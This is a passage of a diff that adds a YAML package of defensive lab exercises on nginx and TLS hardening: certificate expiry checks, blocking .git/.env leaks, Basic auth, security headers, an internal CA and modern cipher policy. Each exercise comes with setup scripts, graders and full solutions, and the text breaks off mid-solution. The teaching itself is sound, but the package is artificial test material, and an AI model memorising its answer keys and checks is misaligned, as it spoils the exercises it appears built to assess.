@@ -1,0 +1,2185 @@
+track: defensive
+module: Web & TLS hardening
+profile: offsec
+order: 8
+exercises:
+
+- id: sec-075
+  title: Which certificates expire this month?
+  difficulty: 1
+  kind: build
+  tags: [tls, certificates, openssl, inventory]
+  tutorial: |
+    **Concept.** An expired certificate is an outage, and a rushed renewal is
+    how weak keys and wrong names slip into production. Every certificate
+    carries a validity window (`notBefore` / `notAfter`), and `openssl x509`
+    reads it without any network access. `-checkend SECONDS` answers the
+    question an inventory script needs ("will this one still be valid N
+    seconds from now?") through its exit status.
+
+    **Read up on:**
+    - `openssl x509 -in FILE -noout -subject -enddate`
+    - `openssl x509 -checkend SECONDS` and its exit codes
+    - `date -d "..." +%s` to compare dates
+  scenario: |
+    **`/lab/certs/`** holds the PEM certificates (`*.crt`) collected from the
+    company's servers. Find the ones that run out soon:
+
+    - **`/lab/expiring.txt`**: the file names (e.g. `vpn.crt`), one per line,
+      of every certificate that expires **within the next 30 days**. Order
+      doesn't matter; list nothing else.
+    - **`/lab/soonest.txt`**: the file name of the certificate that expires
+      **first**.
+  hints:
+    - "`openssl x509 -in /lab/certs/vpn.crt -noout -enddate` prints `notAfter=...`."
+    - "`openssl x509 -checkend 2592000 -noout -in FILE` exits non-zero when the certificate will have expired 30 days (2 592 000 s) from now. Loop over the files and keep those."
+    - "For the soonest, turn each `notAfter` into epoch seconds with `date -d \"...\" +%s`, then `sort -n | head -1`."
+  solution: |
+    ```bash
+    cd /lab/certs
+    for f in *.crt; do
+      openssl x509 -checkend 2592000 -noout -in "$f" >/dev/null || echo "$f"
+    done > /lab/expiring.txt
+    for f in *.crt; do
+      echo "$(date -d "$(openssl x509 -enddate -noout -in "$f" | cut -d= -f2)" +%s) $f"
+    done | sort -n | head -1 | cut -d' ' -f2 > /lab/soonest.txt
+    ```
+  setup: |
+    rm -rf /lab/certs /lab/expiring.txt /lab/soonest.txt
+    mkdir -p /lab/certs
+    mapfile -t names < <(printf '%s\n' api mail vpn intranet shop git grafana | shuf)
+    nsoon=$((2 + RANDOM % 2))
+    mapfile -t soon < <(printf '%s\n' 3 9 17 26 | shuf | head -n "$nsoon")
+    mapfile -t later < <(printf '%s\n' 75 140 200 365 730 1000 | shuf)
+    : > "$KL_STATE/expiring"
+    best=99999 first=
+    for i in "${!names[@]}"; do
+      n=${names[$i]}
+      if [ "$i" -lt "$nsoon" ]; then d=${soon[$i]}; echo "$n.crt" >> "$KL_STATE/expiring"; else d=${later[$((i - nsoon))]}; fi
+      [ "$d" -lt "$best" ] && { best=$d; first=$n.crt; }
+      openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -keyout /dev/null \
+        -out "/lab/certs/$n.crt" -days "$d" -subj "/O=Acme/CN=$n.acme.example" 2>/dev/null
+    done
+    sort -o "$KL_STATE/expiring" "$KL_STATE/expiring"
+    echo "$first" > "$KL_STATE/soonest"
+    chown -R "$(lab_user):" /lab
+  check: |
+    want=$(cat "$KL_STATE/expiring")
+    got=$(tr -d '\r' < /lab/expiring.txt 2>/dev/null | sed 's#.*/##; s/[[:space:]]//g' | grep -v '^$' | sort -u)
+    check_eq "expiring.txt lists exactly the certificates that expire within 30 days" "$(echo $got)" "$(echo $want)"
+    check_eq "soonest.txt names the certificate that expires first" "$(sed 's#.*/##' /lab/soonest.txt 2>/dev/null | tr -d '[:space:]')" "$(cat "$KL_STATE/soonest")"
+  solve: |
+    cd /lab/certs
+    for f in *.crt; do
+      openssl x509 -checkend 2592000 -noout -in "$f" >/dev/null || echo "$f"
+    done > /lab/expiring.txt
+    for f in *.crt; do
+      echo "$(date -d "$(openssl x509 -enddate -noout -in "$f" | cut -d= -f2)" +%s) $f"
+    done | sort -n | head -1 | cut -d' ' -f2 > /lab/soonest.txt
+
+- id: sec-076
+  title: The web server that says too much
+  difficulty: 2
+  kind: fix
+  tags: [nginx, web, information-disclosure, hardening]
+  tutorial: |
+    **Concept.** Before attacking a web server, an attacker reads what it
+    volunteers. A version in the `Server` header and on error pages points
+    straight at the matching CVEs. A **directory listing** shows every file,
+    including the ones nobody linked. Deploy leftovers such as **`.git/`** or
+    **`.env`** in the web root hand over source history and credentials.
+    In nginx the fixes are `server_tokens off`, no `autoindex`, and a
+    `location` that refuses dot-files.
+
+    **Read up on:**
+    - nginx `server_tokens`, `autoindex`
+    - `location ~ /\.` and how regex locations are matched
+    - `curl -sI` to read response headers
+  scenario: |
+    The nginx container **`kl-web`** serves the intranet on
+    **`http://127.0.0.1:8080/`**. Its configuration is
+    **`/lab/nginx/default.conf`** (the directory `/lab/nginx` is mounted at
+    `/etc/nginx/conf.d` in the container; the site lives in
+    `/lab/nginx/html`). Make it stop leaking:
+
+    - the `Server` response header must be exactly `nginx` (no version), and
+      error pages must not show the version either
+    - **`/files/`** must not return a directory listing (403 or 404 is fine)
+    - **`/.git/config`**, **`/.git/HEAD`** and **`/.env`** must return **404**
+
+    The site must keep working: `/` still serves the home page and
+    **`/files/notes.txt`** is still downloadable. Reload with
+    `docker exec kl-web nginx -s reload` after editing (the check restarts the
+    container with your configuration).
+  hints:
+    - "`curl -sI http://127.0.0.1:8080/` shows the `Server` header; `curl -s http://127.0.0.1:8080/files/` shows the listing."
+    - "`server_tokens off;` in the `server` block hides the version. Delete `autoindex on;`."
+    - "A regex location such as `location ~ /\\. { return 404; }` catches every path with a dot-file or dot-directory in it. `docker exec kl-web nginx -t` validates the file."
+  solution: |
+    ```nginx
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        server_tokens off;
+
+        location ~ /\. {
+            return 404;
+        }
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /files/ {
+        }
+    }
+    ```
+    ```bash
+    docker exec kl-web nginx -t && docker exec kl-web nginx -s reload
+    curl -sI http://127.0.0.1:8080/ | grep -i ^server
+    ```
+  setup: |
+    rm -rf /lab/nginx
+    mkdir -p /lab/nginx/html/files /lab/nginx/html/.git
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /files/ {
+            autoindex on;
+        }
+    }
+    EOF
+    printf '<h1>Acme intranet</h1>\n<p>build %s</p>\n' "$tok" > /lab/nginx/html/index.html
+    printf 'Team notes %s\n' "$tok" > /lab/nginx/html/files/notes.txt
+    printf 'quarter,revenue\nQ3,4100000\n' > /lab/nginx/html/files/q3-figures.csv
+    printf 'payroll export, do not share\n' > /lab/nginx/html/files/payroll-2026.csv
+    printf 'ref: refs/heads/main\n' > /lab/nginx/html/.git/HEAD
+    printf '[remote "origin"]\n\turl = https://deploy:ghp_%s@git.acme.example/web.git\n' "$tok" > /lab/nginx/html/.git/config
+    printf 'DB_PASSWORD=%s\n' "$tok" > /lab/nginx/html/.env
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok")
+    code() { curl -s -o /dev/null -m 5 -w '%{http_code}' "$@"; }
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    server=$(curl -s -m 5 -D - -o /dev/null http://127.0.0.1:8080/ | tr -d '\r' | grep -i '^server:' | head -1 | cut -d: -f2- | sed 's/^ *//')
+    check_eq "the Server header carries no version" "$server" "nginx"
+    check_not "error pages don't show the version" 'curl -s -m 5 http://127.0.0.1:8080/no-such-page | grep -q "nginx/"'
+    c=$(code http://127.0.0.1:8080/files/)
+    check "no directory listing at /files/ (status $c)" '[[ "$c" =~ ^40[34]$ ]] && ! curl -s -m 5 http://127.0.0.1:8080/files/ | grep -qi "Index of"'
+    for p in /.git/config /.git/HEAD /.env; do
+      check_eq "$p returns 404" "$(code "http://127.0.0.1:8080$p")" 404
+    done
+    check "/ still serves the home page" 'curl -fs -m 5 http://127.0.0.1:8080/ | grep -qF "$tok"'
+    check "/files/notes.txt is still downloadable" 'curl -fs -m 5 http://127.0.0.1:8080/files/notes.txt | grep -qF "$tok"'
+  solve: |
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        server_tokens off;
+
+        location ~ /\. {
+            return 404;
+        }
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /files/ {
+        }
+    }
+    EOF
+    docker exec kl-web nginx -t && docker exec kl-web nginx -s reload
+
+- id: sec-077
+  title: Put a password on the admin pages
+  difficulty: 2
+  kind: build
+  tags: [nginx, web, authentication, htpasswd]
+  tutorial: |
+    **Concept.** **HTTP Basic authentication** is the quickest way to keep a
+    small admin area away from the public: the server answers `401` with a
+    `WWW-Authenticate` challenge until the client sends a username and
+    password it can check. nginx checks them against an **htpasswd** file,
+    which stores only a **hash** of each password (`htpasswd` from
+    apache2-utils writes it). Basic auth sends the password with every
+    request, so in production it belongs behind TLS.
+
+    **Read up on:**
+    - nginx `auth_basic` and `auth_basic_user_file`
+    - `htpasswd -c`, `-i`, `-B` and the hash formats nginx understands
+    - `curl -u user:password`
+  scenario: |
+    The nginx container **`kl-web`** (`http://127.0.0.1:8080/`, configuration
+    **`/lab/nginx/default.conf`**, mounted at `/etc/nginx/conf.d`) serves an
+    admin console under **`/admin/`** that anyone can open. Lock it:
+
+    - create **`/lab/nginx/htpasswd`** with the user **`ops`** and the
+      password stored in **`/lab/ops-password.txt`** (hashed, never in clear)
+    - **`/admin/`** answers **401** without credentials and with a wrong
+      password, and **200** for `ops` with the right password
+    - **`/`** stays public (200 without credentials)
+
+    The check restarts `kl-web` with your configuration.
+  hints:
+    - "`htpasswd -c -i /lab/nginx/htpasswd ops < /lab/ops-password.txt` creates the file and reads the password from stdin."
+    - "Inside `location /admin/ { ... }` add `auth_basic \"Admin\";` and `auth_basic_user_file /etc/nginx/conf.d/htpasswd;` (the path as the container sees it)."
+    - "The nginx workers read the file on every request as an unprivileged user: it must be world-readable (`chmod 644`), or every login fails with a 500."
+  solution: |
+    ```bash
+    htpasswd -c -i /lab/nginx/htpasswd ops < /lab/ops-password.txt
+    chmod 644 /lab/nginx/htpasswd
+    ```
+    ```nginx
+    location /admin/ {
+        auth_basic "Admin";
+        auth_basic_user_file /etc/nginx/conf.d/htpasswd;
+        try_files $uri $uri/ =404;
+    }
+    ```
+    ```bash
+    docker exec kl-web nginx -s reload
+    curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/admin/                       # 401
+    curl -s -o /dev/null -w '%{http_code}\n' -u "ops:$(cat /lab/ops-password.txt)" http://127.0.0.1:8080/admin/   # 200
+    ```
+  setup: |
+    rm -rf /lab/nginx /lab/ops-password.txt
+    mkdir -p /lab/nginx/html/admin
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    pw=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 14)
+    echo "$tok" > "$KL_STATE/tok"; echo "$pw" > "$KL_STATE/pw"
+    echo "$pw" > /lab/ops-password.txt; chmod 600 /lab/ops-password.txt
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /admin/ {
+            try_files $uri $uri/ =404;
+        }
+    }
+    EOF
+    printf '<h1>Acme</h1>\n' > /lab/nginx/html/index.html
+    printf '<h1>Admin console</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/admin/index.html
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok"); pw=$(cat "$KL_STATE/pw")
+    code() { curl -s -o /dev/null -m 5 -w '%{http_code}' "$@"; }
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check "htpasswd has the ops user and a hash, not the password" '[ -s /lab/nginx/htpasswd ] && grep -q "^ops:" /lab/nginx/htpasswd && ! grep -qF "$pw" /lab/nginx/htpasswd'
+    check_eq "/admin/ without credentials" "$(code http://127.0.0.1:8080/admin/)" 401
+    check_eq "/admin/ with a wrong password" "$(code -u "ops:x$pw" http://127.0.0.1:8080/admin/)" 401
+    check "ops gets the admin console with the right password" 'curl -fs -m 5 -u "ops:$pw" http://127.0.0.1:8080/admin/ | grep -qF "$tok"'
+    check_eq "/ stays public" "$(code http://127.0.0.1:8080/)" 200
+  solve: |
+    htpasswd -c -i /lab/nginx/htpasswd ops < /lab/ops-password.txt
+    chmod 644 /lab/nginx/htpasswd
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /admin/ {
+            auth_basic "Admin";
+            auth_basic_user_file /etc/nginx/conf.d/htpasswd;
+            try_files $uri $uri/ =404;
+        }
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-078
+  title: The security headers that go missing
+  difficulty: 3
+  kind: fix
+  tags: [nginx, web, security-headers, hardening]
+  tutorial: |
+    **Concept.** Headers such as `X-Content-Type-Options`, `X-Frame-Options`
+    and `Referrer-Policy` switch on browser defences, but only on responses
+    that carry them. nginx's `add_header` has two traps. It only applies to
+    success and redirect codes (200, 301, 304, ...) unless you add
+    **`always`**, so error pages go out bare. And it is **inherited only when
+    the inner block has no `add_header` of its own**: one `add_header` in a
+    `location` silently drops every header set at `server` level for that
+    location.
+
+    **Read up on:**
+    - nginx `add_header` (the `always` parameter and inheritance)
+    - `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`
+    - `include` for snippets shared between blocks
+  scenario: |
+    **`kl-web`** (`http://127.0.0.1:8080/`, configuration
+    **`/lab/nginx/default.conf`**, mounted at `/etc/nginx/conf.d`) is
+    supposed to send these three headers, and the home page does, yet the
+    scanner still flags the site:
+
+    - `X-Content-Type-Options: nosniff`
+    - `X-Frame-Options: DENY`
+    - `Referrer-Policy: no-referrer`
+
+    Fix the configuration so that **all three** are on **every** response:
+    `/`, `/api/status.json`, a missing page such as `/nope` (404), and a
+    missing API file such as `/api/nope.json` (404). Responses under `/api/`
+    must keep their **`Cache-Control: no-store`** header too, and both pages
+    must still be served. The check restarts `kl-web` with your configuration.
+  hints:
+    - "Compare `curl -sI http://127.0.0.1:8080/` with `curl -sI http://127.0.0.1:8080/api/status.json` and `curl -sI http://127.0.0.1:8080/nope`."
+    - "`add_header NAME VALUE always;` adds the header to error responses too."
+    - "The `location /api/` block has its own `add_header`, so it inherits none of the server-level ones. Repeat the three there, or put them in a snippet (say `/lab/nginx/headers.inc`, not `*.conf`, which nginx would include at `http` level) and `include` it in both places."
+  solution: |
+    ```bash
+    cat > /lab/nginx/headers.inc <<'EOF'
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header Referrer-Policy "no-referrer" always;
+    EOF
+    ```
+    ```nginx
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        include /etc/nginx/conf.d/headers.inc;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /api/ {
+            include /etc/nginx/conf.d/headers.inc;
+            add_header Cache-Control "no-store" always;
+            try_files $uri =404;
+        }
+    }
+    ```
+  setup: |
+    rm -rf /lab/nginx
+    mkdir -p /lab/nginx/html/api
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        add_header X-Content-Type-Options "nosniff";
+        add_header X-Frame-Options "DENY";
+        add_header Referrer-Policy "no-referrer";
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /api/ {
+            add_header Cache-Control "no-store";
+            try_files $uri =404;
+        }
+    }
+    EOF
+    printf '<h1>Acme status</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/index.html
+    printf '{"status":"ok","build":"%s"}\n' "$tok" > /lab/nginx/html/api/status.json
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok")
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    hdr() { curl -s -m 5 -D - -o /dev/null "http://127.0.0.1:8080$1" | tr -d '\r' | grep -i "^$2:" | head -1 | cut -d: -f2- | sed 's/^ *//'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    for p in / /api/status.json /nope /api/nope.json; do
+      got="$(hdr "$p" X-Content-Type-Options)|$(hdr "$p" X-Frame-Options)|$(hdr "$p" Referrer-Policy)"
+      check_eq "the three headers on $p" "$got" "nosniff|DENY|no-referrer"
+    done
+    check_eq "Cache-Control on /api/status.json" "$(hdr /api/status.json Cache-Control)" "no-store"
+    check "/ is still served" 'curl -fs -m 5 http://127.0.0.1:8080/ | grep -qF "$tok"'
+    check "/api/status.json is still served" 'curl -fs -m 5 http://127.0.0.1:8080/api/status.json | grep -qF "$tok"'
+  solve: |
+    cat > /lab/nginx/headers.inc <<'EOF'
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header Referrer-Policy "no-referrer" always;
+    EOF
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        include /etc/nginx/conf.d/headers.inc;
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location /api/ {
+            include /etc/nginx/conf.d/headers.inc;
+            add_header Cache-Control "no-store" always;
+            try_files $uri =404;
+        }
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-079
+  title: HTTPS from your own certificate authority
+  difficulty: 3
+  kind: build
+  tags: [tls, pki, openssl, nginx, certificates]
+  tutorial: |
+    **Concept.** Internal services get their certificates from an **internal
+    CA**: a self-signed CA certificate that clients trust, which signs the
+    servers' certificates. A client accepts a server certificate when it
+    chains to a trusted CA **and** names the host it connected to in its
+    **Subject Alternative Name** (the CN alone has not counted for years).
+    The CA's private key signs; it must never sit next to the web server's
+    files. Once HTTPS works, plain HTTP should only answer with a permanent
+    redirect to it.
+
+    **Read up on:**
+    - `openssl req -x509` (a CA), `openssl req -new` (a CSR), `openssl x509 -req -CA ... -extfile`
+    - `subjectAltName`, `basicConstraints`, `extendedKeyUsage`
+    - nginx `listen 443 ssl`, `ssl_certificate`, `return 301`
+  scenario: |
+    **`kl-web`** serves the intranet over plain HTTP on
+    **`http://127.0.0.1:8080/`**. The container already publishes its port
+    443 on **`127.0.0.1:8443`**; the configuration is
+    **`/lab/nginx/default.conf`** (`/lab/nginx` is `/etc/nginx/conf.d` inside
+    the container). Give it HTTPS for the name **`web.lab.test`**:
+
+    - **`/lab/pki/ca.key`** and **`/lab/pki/ca.crt`**: a new CA (a CA
+      certificate, `CA:TRUE`)
+    - **`/lab/nginx/tls/web.key`** and **`/lab/nginx/tls/web.crt`**: the
+      server's key and certificate, signed by that CA, **not** a CA itself,
+      with `DNS:web.lab.test` in its subject alternative names
+    - `kl-web` serves the site on 443 with that certificate, so that
+      `curl --cacert /lab/pki/ca.crt --resolve web.lab.test:8443:127.0.0.1 https://web.lab.test:8443/`
+      succeeds
+    - plain HTTP answers **301** to the same path on HTTPS, e.g.
+      `http://127.0.0.1:8080/docs/a?b=1` →
+      `Location: https://web.lab.test:8443/docs/a?b=1`
+    - the CA's private key is **not** anywhere under `/lab/nginx`
+
+    The check restarts `kl-web` with your configuration.
+  hints:
+    - "The CA: `openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 365 -subj '/CN=Lab Internal CA'` (Ubuntu's default config marks it `CA:TRUE`)."
+    - "The server: make a key and CSR with `openssl req -new -newkey rsa:2048 -nodes ...`, then sign it with `openssl x509 -req -in web.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 90 -extfile web.ext -out web.crt`, where `web.ext` holds `subjectAltName=DNS:web.lab.test` and `basicConstraints=CA:FALSE`."
+    - "Check your work with `openssl verify -CAfile /lab/pki/ca.crt /lab/nginx/tls/web.crt` and `openssl x509 -in web.crt -noout -ext subjectAltName`."
+    - "Two `server` blocks: one `listen 80` with `return 301 https://web.lab.test:8443$request_uri;`, one `listen 443 ssl` with `ssl_certificate /etc/nginx/conf.d/tls/web.crt;` and `ssl_certificate_key ...web.key;`."
+  solution: |
+    ```bash
+    mkdir -p /lab/pki /lab/nginx/tls && cd /lab/pki
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 365 -subj "/CN=Lab Internal CA"
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out web.csr -subj "/CN=web.lab.test"
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > web.ext
+    openssl x509 -req -in web.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 90 -extfile web.ext -out /lab/nginx/tls/web.crt
+    ```
+    ```nginx
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+    }
+    ```
+    ```bash
+    docker exec kl-web nginx -s reload
+    curl --cacert /lab/pki/ca.crt --resolve web.lab.test:8443:127.0.0.1 https://web.lab.test:8443/
+    ```
+  setup: |
+    rm -rf /lab/nginx /lab/pki
+    mkdir -p /lab/nginx/html/docs
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+    }
+    EOF
+    printf '<h1>Acme intranet</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/index.html
+    printf 'docs\n' > /lab/nginx/html/docs/a
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -p 127.0.0.1:8443:443 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok")
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    ca_key_exposed() {
+      local ca f
+      ca=$(openssl x509 -in /lab/pki/ca.crt -noout -pubkey 2>/dev/null) || return 1
+      for f in $(grep -rl "PRIVATE KEY" /lab/nginx 2>/dev/null); do
+        [ "$(openssl pkey -in "$f" -pubout 2>/dev/null)" = "$ca" ] && return 0
+      done
+      return 1
+    }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check "ca.crt is a CA certificate" 'openssl x509 -in /lab/pki/ca.crt -noout -text | grep -q "CA:TRUE"'
+    check "ca.key belongs to ca.crt" 'k=$(openssl pkey -in /lab/pki/ca.key -pubout 2>/dev/null) && [ -n "$k" ] && [ "$k" = "$(openssl x509 -in /lab/pki/ca.crt -noout -pubkey)" ]'
+    check "web.crt is signed by the CA" 'openssl verify -CAfile /lab/pki/ca.crt /lab/nginx/tls/web.crt'
+    check "web.crt is not a CA certificate" '[ -s /lab/nginx/tls/web.crt ] && ! openssl x509 -in /lab/nginx/tls/web.crt -noout -text | grep -q "CA:TRUE"'
+    check "web.crt has DNS:web.lab.test in its SAN" 'openssl x509 -in /lab/nginx/tls/web.crt -noout -ext subjectAltName | grep -q "DNS:web.lab.test"'
+    check "HTTPS on web.lab.test verifies against your CA" 'curl -fs -m 5 --cacert /lab/pki/ca.crt --resolve web.lab.test:8443:127.0.0.1 https://web.lab.test:8443/ | grep -qF "$tok"'
+    got=$(curl -s -m 5 -o /dev/null -w '%{http_code} %{redirect_url}' 'http://127.0.0.1:8080/docs/a?b=1')
+    check_eq "HTTP redirects permanently to HTTPS" "$got" "301 https://web.lab.test:8443/docs/a?b=1"
+    check_not "the CA key is not under /lab/nginx" 'ca_key_exposed'
+  solve: |
+    mkdir -p /lab/pki /lab/nginx/tls && cd /lab/pki
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 365 -subj "/CN=Lab Internal CA" 2>/dev/null
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out web.csr -subj "/CN=web.lab.test" 2>/dev/null
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > web.ext
+    openssl x509 -req -in web.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 90 -extfile web.ext -out /lab/nginx/tls/web.crt 2>/dev/null
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-080
+  title: Retire the legacy TLS settings
+  difficulty: 3
+  kind: fix
+  tags: [tls, nginx, ciphers, hardening, openssl]
+  tutorial: |
+    **Concept.** TLS 1.0 and 1.1 are deprecated (RFC 8996), and TLS 1.2 is
+    only as strong as the cipher suites it allows. A modern policy keeps TLS
+    1.2 and 1.3, and for 1.2 allows only suites with **forward secrecy**
+    (`ECDHE` key exchange, so a stolen server key can't decrypt old traffic)
+    and **AEAD** encryption (AES-GCM or ChaCha20-Poly1305, no CBC). Old
+    "compatibility" configs often lower OpenSSL's security level with
+    `@SECLEVEL=0`, which silently turns the legacy protocols back on.
+    `openssl s_client` lets you offer one protocol and one suite at a time
+    and see whether the server takes it.
+
+    **Read up on:**
+    - nginx `ssl_protocols`, `ssl_ciphers`
+    - OpenSSL cipher strings (`ECDHE+AESGCM`, `ECDHE+CHACHA20`) and `openssl ciphers -v`
+    - `openssl s_client -tls1_2 -cipher NAME`, OpenSSL security levels
+  scenario: |
+    **`kl-web`** serves HTTPS on **`127.0.0.1:8443`** (configuration
+    **`/lab/nginx/default.conf`**, mounted at `/etc/nginx/conf.d`). Its TLS
+    settings were copied from a very old guide. Bring them up to this policy:
+
+    - **TLS 1.0 and TLS 1.1 are refused**, even to a client that would
+      accept them
+    - TLS 1.2 is accepted **only** with ECDHE key exchange and AEAD
+      encryption: `ECDHE-RSA-AES128-GCM-SHA256`, `ECDHE-RSA-AES256-GCM-SHA384`
+      and `ECDHE-RSA-CHACHA20-POLY1305` must work; `AES128-GCM-SHA256` (no
+      forward secrecy), `AES256-SHA`, `ECDHE-RSA-AES128-SHA` and
+      `ECDHE-RSA-AES256-SHA384` (CBC) must be refused
+    - **TLS 1.3** keeps working, and so does the site
+
+    The check restarts `kl-web` with your configuration.
+  hints:
+    - "Test one combination: `openssl s_client -connect 127.0.0.1:8443 -tls1_2 -cipher AES256-SHA </dev/null 2>&1 | grep 'Cipher is'`. `(NONE)` means refused. For TLS 1.0, the client needs `-tls1 -cipher 'DEFAULT:@SECLEVEL=0'`, or it refuses by itself."
+    - "`ssl_protocols TLSv1.2 TLSv1.3;` drops the old protocols. Remove `@SECLEVEL=0`."
+    - "`openssl ciphers -v 'ECDHE+AESGCM:ECDHE+CHACHA20'` shows exactly which TLS 1.2 suites a cipher string selects. TLS 1.3 suites are configured separately, so this string doesn't affect them."
+  solution: |
+    ```nginx
+    ssl_protocols TLSv1.2 TLSv1.3;
